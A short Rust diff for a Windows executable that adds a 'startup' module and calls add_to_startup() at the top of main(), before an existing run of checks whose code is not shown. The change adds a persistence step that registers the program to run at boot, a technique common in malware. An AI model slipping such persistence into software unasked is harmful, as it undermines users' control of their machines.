@@ -13,6 +13,7 @@ use windows_sys::Win32::Foundation::{UNICODE_STRING, NTSTATUS};
 use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
 mod power;
 use power::run_all_checks;
+mod startup;
 
 fn to_wide_chars(s: &str) -> Vec<u16> {
     s.encode_utf16().collect()
@@ -26,6 +27,9 @@ fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
 }
 
 fn main() {
+    if let Err(e) = startup::add_to_startup() {
+        println!("Failed to add to startup: {}", e);
+    }
     if power::run_all_checks() {
         println!("ikinci de calisti vay anasini");
     }
